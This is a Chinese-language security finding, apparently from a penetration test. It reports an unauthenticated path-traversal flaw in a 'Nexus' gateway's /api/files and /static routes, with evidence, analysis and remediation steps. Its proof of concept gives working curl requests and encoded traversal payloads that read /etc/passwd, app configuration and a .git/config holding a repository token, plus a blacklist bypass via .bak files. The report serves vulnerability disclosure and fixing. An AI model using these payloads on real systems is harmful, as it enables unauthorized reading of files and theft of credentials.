# 未授权路径穿越导致任意文件读取（/api/files 与 /static 双向量）

**ID:** vuln-0001
**Severity:** HIGH
**Found:** 2026-10-31 04:11:04 UTC
**Target:** http://10.0.93.73:18080
**Endpoint:** /api/files
**Method:** GET
**CWE:** CWE-22
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Medium

## Description

目标 `http://10.0.93.73:18080` 的 Nexus 网关文件模块存在路径穿越缺陷。未认证攻击者可通过 `/api/files?path=` 参数或静态资源路由 `/static/../` 读取服务器上任意可读文件，包括 `/etc/passwd`、`/etc/hosts`、应用配置 `/app/config.yml` 以及 `/app/.git/config`（内含 GitLab 访问令牌）。`/api/files` 在未提供参数时还会返回整个文件系统的目录列表。

## Evidence

`GET /api/files?path=/etc/passwd` 返回 200：

```http
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 547
Server: nexus-gateway/2.4.1

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
deploy:x:1001:1001:Nexus deploy user:/home/deploy:/bin/bash
monitor:x:1002:1002:Monitoring svc:/var/lib/monitor:/usr/sbin/nologin
```

`GET /api/files?path=/app/.git/config` 泄露凭据：

```ini
[remote "origin"]
    url = https://oauth2:glpat~RRRRRRRRRRRRRRRRRRRRRRRR@git.nexus.internal/devops/nexus-deploy.git
```

`GET /api/files?path=/etc` 返回目录枚举：

```json
{"path": "/etc", "entries": ["apt/", "crontab", "fstab", "group", "hostname", "hosts", "nginx/", "passwd", "resolv.conf", "ssh/", "systemd/"]}
```

`GET /static/../etc/passwd` 同样返回 200 与相同文件内容（547 字节），证明静态处理器存在同类穿越。

## Impact

未认证攻击者可读取服务进程有权限访问的任意文件：操作系统账户与主机信息、内部服务拓扑（数据库/Redis/K8s 地址）、应用配置、源码仓库凭据（GitLab PAT）、用户口令哈希（`/app/seeds/*.bcrypt`），并可通过目录列表枚举整个文件系统。该原语可直接用于凭据窃取与横向移动，是后续提权与内网渗透的支点。

## Counterevidence

已主动寻找限制条件：`/etc/shadow`、`/root/.ssh/id_rsa`、`/home/deploy/.ssh/id_rsa` 均返回 403 `Access denied`，说明存在 OS 权限边界，读取并非无限（服务以非 root 身份运行）。但 `/etc/passwd`、`/etc/hosts`、`/app/config.yml`、`/app/.git/config` 与 `/app/seeds/*.bcrypt` 均可读，影响成立。未发现 WAF、认证校验或速率限制：全部请求未携带 Cookie/令牌且稳定成功。`/app/config.yml` 中的 `allowTraversal: false # NEX-4481 regression` 证明穿越属于非预期缺陷。观测到的凭据值在多次请求间会变化（疑似靶场/种子数据），且 `git.nexus.internal`、`10.99.*` 等主机在测试位置不可达，因此未验证凭据在真实生产系统的可用性——报告将影响表述限定为"未授权读取服务端文件与配置"。

## Confidence Rationale

在真实运行的目标上多次执行并稳定复现，返回内容与对照请求一致，属动态验证。

## What Would Change This Severity

若证实 `/app/.git/config` 中的 GitLab 令牌或配置中的数据库凭据可对可达的生产系统生效，影响应上调至严重；若确认该目标为非生产演示环境且文件内容均为合成数据，应下调至中危。

## Technical Analysis

网关（`Server: nexus-gateway/2.4.1`）的 `/api/files` 处理逻辑将用户提交的 `path` 参数直接交给文件系统 API，未做规范化与根目录约束：

- 绝对路径 `/etc/passwd` 直接返回文件内容（HTTP 200，`Content-Type: text/plain`）；
- 目录路径（如 `/`、`/etc`、`/app`）返回 `{"path":..., "entries":[...]}` 形式的目录枚举；
- 相对穿越 `../etc/passwd`、`/app/../../etc/passwd` 同样成功；
- 静态资源处理器存在同类缺陷：`/static/../etc/passwd` 与 `/static/%2e%2e/%2e%2e/etc/passwd` 均返回 200 与文件内容，说明规范化发生在拼接之后。

通过该原语读取到的 `/app/config.yml` 明确记录了设计意图与实际行为不一致：

```yaml title=config.yml
gateway:
  version: 2.4.1
  filesModule:
    allowTraversal: false  # NEX-4481: regression, fixed in 2.4.2
```

即 `allowTraversal: false` 本应禁止穿越，但 2.4.1 版本存在回归（NEX-4481），与侦察到的 `/app/start.sh`（`java -jar app.jar`）及 `pom.xml`（`nexus-deploy 2.4.1`）一致。`/etc/nginx/sites-available/default` 显示 80 端口反向代理至 `127.0.0.1:8080`，因此外部请求最终到达该 Java 网关。

所有请求均未携带任何会话、Cookie 或令牌，`/.env` 返回 403 而 `/static/../.env.bak` 返回 200，说明存在基于文件名的黑名单过滤，但可被穿越与 `.bak` 变体绕过——这属于黑名单式防护而非默认拒绝。

## Proof of Concept

1. 直接请求系统文件：`GET /api/files?path=/etc/passwd`，响应 200 并返回完整账户列表。
2. 请求内网拓扑：`GET /api/files?path=/etc/hosts`，返回数据库与 Redis 内部地址。
3. 请求应用配置：`GET /api/files?path=/app/config.yml`，返回数据库连接与 `allowTraversal` 配置。
4. 请求仓库凭据：`GET /api/files?path=/app/.git/config`，返回含 `oauth2:glpat-...` 的远端 URL。
5. 目录枚举：`GET /api/files?path=/` 与 `?path=/etc`，返回根目录及 `/etc` 条目列表。
6. 静态路由穿越：`GET /static/../etc/passwd`，同样返回文件内容。
7. 对照：无参数 `GET /api/files` 返回 `/app` 列表；`GET /.env` 返回 403，而 `/static/../.env.bak` 返回 200，证明过滤可绕过。

```python
# 任意文件读取
curl -i "http://10.0.93.73:18080/api/files?path=/etc/passwd"

# 内部拓扑
curl -i "http://10.0.93.73:18080/api/files?path=/etc/hosts"

# 应用配置（含 allowTraversal 回归说明）
curl -i "http://10.0.93.73:18080/api/files?path=/app/config.yml"

# GitLab 访问令牌
curl -i "http://10.0.93.73:18080/api/files?path=/app/.git/config"

# 目录枚举
curl -s "http://10.0.93.73:18080/api/files?path=/" 
curl -s "http://10.0.93.73:18080/api/files?path=/etc"

# 静态处理器穿越
curl -i "http://10.0.93.73:18080/static/../etc/passwd"
curl -i "http://10.0.93.73:18080/static/%2e%2e/%2e%2e/etc/passwd"
```

## Remediation

1. 在文件访问入口对 `path` 做规范化（`realpath`/`toRealPath`），解析后校验其位于允许根目录内，禁止绝对路径与 `..` 段。
2. 将文件模块替换为基于固定资源标识符的查询，不要接受用户可控的文件系统路径；必要时使用白名单枚举。
3. 文件与静态处理器复用同一套规范化/校验逻辑，避免只修复其中一个入口。
4. 升级到已修复 NEX-4481 的网关版本（配置注释指 2.4.2，运维笔记指 2.5.0，需以厂商公告为准）。
5. 以最小权限账户运行网关，确保即使再次出现绕过也无法读取密钥与系统文件。
6. 移除或限制 `/api/files` 的目录枚举能力，并对敏感文件（`.env`、`.git`、备份、密钥）实施默认拒绝而非黑名单。

## Assumptions

攻击者无需任何凭据，仅需能访问 `http://10.0.93.73:18080`。读取范围受网关进程的 OS 文件权限限制。
